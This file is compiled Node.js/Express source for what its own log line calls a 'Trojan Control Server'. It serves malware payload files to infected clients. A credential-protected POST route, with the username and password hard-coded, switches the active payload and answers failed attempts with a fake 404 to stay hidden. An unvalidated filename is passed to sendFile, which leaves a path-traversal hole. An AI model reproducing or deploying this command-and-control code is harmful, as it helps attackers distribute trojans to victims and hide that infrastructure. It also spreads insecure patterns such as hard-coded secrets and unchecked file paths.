"use strict";
Object.defineProperty(exports, "__esModule", { value: true });
const express = require("express");
const routes_1 = require("./routes");
const app = express();
app.use(express.json());
// Terrible practice here
const LANCEG_USERNAME = "lanceg";
const LANCEG_PASSWORD = "hardcoded17@-password$76-lol";
let filename;
app.get(routes_1.DEFAULT_ROUTE, function (req, res) {
    console.log(`GET ${routes_1.DEFAULT_ROUTE}`);
    res.send("Hello chief");
});
app.post(routes_1.SET_PAYLOAD_ROUTE, function (req, res) {
    console.log(`POST ${routes_1.SET_PAYLOAD_ROUTE}`);
    if (req.body) {
        if (req.body.username9000 === LANCEG_USERNAME &&
            req.body.password9001 === LANCEG_PASSWORD &&
            req.body.filename) {
            filename = req.body.filename;
            console.log(`Changed payload to ${filename}`);
            res.send(`Changed payload to ${filename}`);
            return;
        }
    }
    console.log(`Invalid request`);
    if (req.body) {
        console.log(`Request body: ${JSON.stringify(req.body)}`);
    }
    // Make the requester think this isn't a valid route
    res.status(404);
    res.send(`Cannot POST ${routes_1.SET_PAYLOAD_ROUTE}`);
});
app.get(routes_1.FILENAME_ROUTE, function (req, res) {
    console.log(`GET ${routes_1.FILENAME_ROUTE}`);
    res.send(filename || "null");
});
app.get(routes_1.FILE_ROUTE, function (req, res) {
    console.log(`GET ${routes_1.FILE_ROUTE}`);
    if (filename) {
        // If someone finds 'SET_PAYLOAD_ROUTE', they can exploit this
        res.sendFile(`./files/${filename}`, { root: __dirname });
    }
    else {
        res.status(404);
        res.send(`Cannot GET ${routes_1.FILE_ROUTE}`);
    }
});
app.listen(3000, function () {
    console.log("Trojan Control Server listening on port 3000");
});
